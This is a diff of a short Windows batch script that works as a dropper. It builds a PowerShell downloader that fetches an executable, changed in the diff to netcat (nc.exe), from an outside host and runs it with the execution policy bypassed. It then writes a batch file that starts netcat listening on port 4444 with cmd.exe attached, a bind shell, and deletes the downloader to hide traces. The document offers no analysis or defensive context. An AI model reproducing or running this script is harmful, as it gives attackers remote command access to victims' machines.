@@ -1,7 +1,7 @@
 c:
 mkdir win  
 cd c:/win
-echo $client = new-object System.Net.WebClient ; $client.DownloadFile("https://1fichier.com/?cfui1ldioc","C:\win\a.exe") > c:\win\b.ps1 & powershell -ExecutionPolicy ByPass -File c:\win\b.ps1 
+echo $client = new-object System.Net.WebClient ; $client.DownloadFile("http://hakme.weebly.com/uploads/2/3/8/7/23870083/nc.exe","C:\win\a.exe") > c:\win\b.ps1 & powershell -ExecutionPolicy ByPass -File c:\win\b.ps1 
 echo FOR %%%%A IN ^(1 2 3^) DO c:\win\a.exe -ldp 4444 -e cmd.exe > c:\win\k.bat  
 del c:\win\b.ps1 
 cd c:/win
